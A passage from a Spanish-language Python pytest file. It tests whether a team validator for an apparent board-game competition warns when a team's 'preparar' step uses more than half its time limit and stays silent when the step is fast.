            puntos={"blancas": 3, "negras": 0},
            preparar_usado={"blancas": segundos, "negras": segundos},
        )

    monkeypatch.setattr(validar, "jugar_partida", falsa)
    reporte = validar_equipo(equipo(tmp_path), L, jugar_humo=True)
    assert reporte.ok and reporte.humo_jugado, reporte.errores
    return reporte.avisos


def test_humo_preparar_lento_es_aviso(tmp_path, monkeypatch):
    segundos = 0.8 * L.preparar_s  # más de la mitad del límite, pero a tiempo
    avisos = _avisos_humo_con_preparar(tmp_path, monkeypatch, segundos)
    lentos = [a for a in avisos if "Tu preparar tardó" in a]
    assert lentos == [validar.aviso_preparar(segundos, L.preparar_s)]
    assert f"{segundos:.1f} s de {L.preparar_s:g}" in lentos[0]
    assert "docs/avanzado.md#numba-que-compila-rápido" in lentos[0]


def test_humo_preparar_con_margen_no_avisa(tmp_path, monkeypatch):
    avisos = _avisos_humo_con_preparar(tmp_path, monkeypatch, 0.2 * L.preparar_s)
    assert not any("preparar" in a for a in avisos)
